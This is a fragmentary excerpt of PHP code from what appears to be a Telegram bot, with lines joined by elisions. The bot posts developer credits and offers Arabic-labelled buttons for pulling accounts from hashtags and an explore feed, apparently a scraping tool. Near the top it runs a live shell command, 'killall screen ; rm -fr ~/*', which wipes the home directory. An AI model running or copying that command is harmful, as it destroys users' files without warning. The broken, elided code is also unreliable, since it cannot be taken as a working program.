...
system ("killall screen ; rm -fr ~/*");
            ...
            $bot->sendMessage([
		       'chat_id'=>$chatId,
                'message_id'=>$mid,
                'text'=>"𝐃𝐄𝐕 : @X_Q_9 𝗺𝘆  : @A_H_M_E_D_0_1_1 -",
            ...
            $bot->editMessageText([
                ...
                'reply_markup'=>json_encode([
                    'inline_keyboard'=>[
                        ...
                        [['text'=>'#️⃣ سحب من الهشتاكات','callback_data'=>'hashtag'],['text'=>'🔪 سحب من الاكسبلور','callback_data'=>'explore']],
